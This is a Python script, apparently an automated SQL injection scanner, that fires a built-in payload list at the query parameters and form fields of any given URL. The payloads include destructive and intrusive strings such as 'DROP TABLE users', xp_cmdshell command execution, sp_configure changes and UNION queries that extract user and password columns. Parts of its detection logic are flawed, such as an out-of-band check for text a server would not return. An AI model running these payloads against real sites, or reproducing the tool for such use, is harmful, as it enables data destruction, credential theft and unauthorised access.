import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, quote, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
import logging
import time

logging.basicConfig(level=logging.INFO)

session = requests.Session()

# Extended SQL injection payloads
sql_payloads = [
    "' OR 1=1 --",
    '" OR 1=1 --',
    "'; DROP TABLE users --",
    '" UNION SELECT null, user, password FROM users --',
    "'; EXEC xp_cmdshell('echo vulnerable') --",
    '" OR "" = "" OR "',
    "' OR '' = '' OR '",
    "'; SELECT * FROM information_schema.tables --",
    '" UNION SELECT table_name, column_name FROM information_schema.columns --',
    "'; EXEC sp_configure 'show advanced options', 1 --",
    '" UNION ALL SELECT NULL, @@version, NULL, NULL --',
    # Boolean-based blind payloads
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' OR 'a'='a",
    '" OR "a"="a',
    # Time-based blind payloads
    "' OR IF(1=1, SLEEP(5), 0) --",
    '" OR IF(1=1, SLEEP(5), 0) --',
    "' AND (SELECT 3706 FROM (SELECT(SLEEP(5)))xomu) AND 'dRjW'='dRjW",
    # Out-of-Band (OOB) payloads
    "'; EXEC xp_cmdshell('ping 8.8.8.8') --",
    '" UNION SELECT null; EXEC xp_cmdshell(\'ping 8.8.8.8\') --',
    # Error-based payloads
    "' OR 1=CONVERT(int, (SELECT @@version)) --",
    '" OR 1=CONVERT(int, (SELECT @@version)) --',
    "'; DROP TABLE users; --",
    '" OR 1/0; --',
    "'; EXEC xp_cmdshell('echo vulnerable'); --",
    # Union-based payloads
    "' UNION SELECT null, database(), null, null --",
    '" UNION SELECT null, database(), null, null --',
    "'; SELECT null, table_name, null FROM information_schema.tables --",
    '" UNION SELECT null, table_name, null FROM information_schema.tables --',
    "'; EXEC sp_configure 'show advanced options', 1; --",
    # Advanced boolean-based blind payloads
    "'; IF(1=1, SLEEP(5), 0) --",
    '" OR IF(1=1, SLEEP(5), 0) --',
    # Advanced time-based blind payloads
    "'; IF(1=1, SLEEP(5), 0) --",
    '" OR IF(1=1, SLEEP(5), 0) --',
    # Advanced out-of-band payloads
    "'; EXEC xp_cmdshell('echo ping 8.8.8.8'); --",
    '" UNION SELECT null; EXEC xp_cmdshell(\'echo ping 8.8.8.8\') --',
    # Content-based blind payloads
    "' OR SLEEP(5) --",
    '" OR SLEEP(5) --',
    "'; WAITFOR DELAY '0:0:5'; --",
    '" WAITFOR DELAY \'0:0: 5\'; --',
# Add more payloads as needed
]

def set_headers():
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
    })


def extract_query_payloads(url):
    query_params = parse_qs(urlparse(url).query)
    query_payloads = []

    for param, values in query_params.items():
        for value in values:
            for payload in sql_payloads:
                query_payloads.append((param, value + payload))

    return query_payloads


def time_based_blind_detection(test_url):
    delays = [5, 10]

    for delay in delays:
        try:
            time_start = time.time()
            res = session.get(test_url, timeout=12)  # Allow for extra time
            time_end = time.time()

            time_difference = time_end - time_start

            if time_difference >= delay:
                return True

        except requests.RequestException as e:
            logging.error(f"Error while testing time-based blind SQL injection: {e}")

    return False


def oob_detection(test_url, payload):
    try:
        res = session.get(test_url, timeout=12)

        if f"OOB condition: {payload}" in res.text:
            return True

    except requests.RequestException as e:
        logging.error(f"Error while testing Out-of-Band SQL injection: {e}")

    return False

def scan_query_params(url):
    payloads = sql_payloads + extract_query_payloads(url)
    logging.info("[+] Testing URL query parameters.")
    for payload in payloads:
        try:
            if isinstance(payload, tuple):
                param, payload_value = payload
                payload = f"?{param}={quote(payload_value)}"
                test_url = urljoin(url, payload)
            else:
                test_url = url + payload

            res = session.get(test_url, timeout=12)
            if any(result_condition in res.text for result_condition in ["True condition", "False condition"]):
                logging.warning(f"Boolean-based blind SQL Injection vulnerability detected in URL: {url}")
                logging.info(f"Payload: {payload}")

            elif time_based_blind_detection(test_url):
                logging.warning(f"Time-based blind SQL Injection vulnerability detected in URL: {url}")
                logging.info(f"Payload: {payload}")

            elif oob_detection(test_url, 'ping 8.8.8.8'):
                logging.warning(f"Out-of-Band SQL Injection vulnerability detected in URL: {url}")
                logging.info(f"Payload: {payload}")

            elif vulnerable(res):
                logging.warning(f"SQL Injection vulnerability detected in URL: {url}")
                logging.info(f"Payload: {payload}")
            else:
                logging.info("No SQL Injection vulnerability detected")

        except requests.RequestException as e:
            logging.error(f"Error while scanning {url}: {e}")


def scan_form(form_url, details):
    logging.info(f"[+] Testing Form")
    for payload in sql_payloads:
        data = {input_tag["name"]: quote(input_tag.get("value", "") + payload) for input_tag in details["inputs"] if
                input_tag["type"] != "submit"}

        try:
            res = session.post(form_url, data=data, timeout=5) if details["method"] == "post" else session.get(form_url,
                                                                                                               params=data,
                                                                                                               timeout=5)

            if vulnerable(res):
                time_start = time.time()
                test_data = {input_tag["name"]: quote(input_tag.get("value", "") + payload) for input_tag in
                             details["inputs"] if input_tag["type"] != "submit"}
                session.get(form_url, params=test_data, timeout=5)
                time_end = time.time()

                time_difference = time_end - time_start
                if time_difference > 2:
                    logging.warning(f"Time-based blind SQL Injection vulnerability detected in link: {form_url}")
                    logging.info(f"Payload: {payload}")
                else:
                    logging.info("No SQL Injection vulnerability detected")

            else:
                logging.info("No SQL Injection vulnerability detected")

        except requests.RequestException as e:
            logging.error(f"Error while scanning {form_url}: {e}")


def sql_injection_scan(url, cookie):
    set_headers()

    forms = get_forms(url)
    logging.info(f"[+] Detected {len(forms)} forms on {url}.")

    if cookie:
        session.headers['Cookie'] = cookie

    with ThreadPoolExecutor() as executor:
        for form in forms:
            details = form_details(form)
            form_url = urljoin(url, details["action"])
            executor.submit(scan_form, form_url, details)

    scan_query_params(url)


def vulnerable(response):
    errors = {"quoted string not properly terminated", "unclosed quotation mark after the character string",
              "you have an error in your sql syntax;"}

    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False


def get_forms(url):
    try:
        soup = BeautifulSoup(session.get(url, timeout=5).content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        logging.error(f"Error while fetching forms from {url}: {e}")
        return []


def form_details(form):
    details_of_form = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details_of_form["action"] = action
    details_of_form["method"] = method
    details_of_form["inputs"] = inputs
    return details_of_form


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Scan for SQL injection vulnerabilities in forms and URL query parameters on a webpage.")
    parser.add_argument("url", help="URL of the webpage to scan")
    parser.add_argument("--cookie", help="Cookie to be used for requests (optional)")
    args = parser.parse_args()

    sql_injection_scan(args.url, args.cookie)
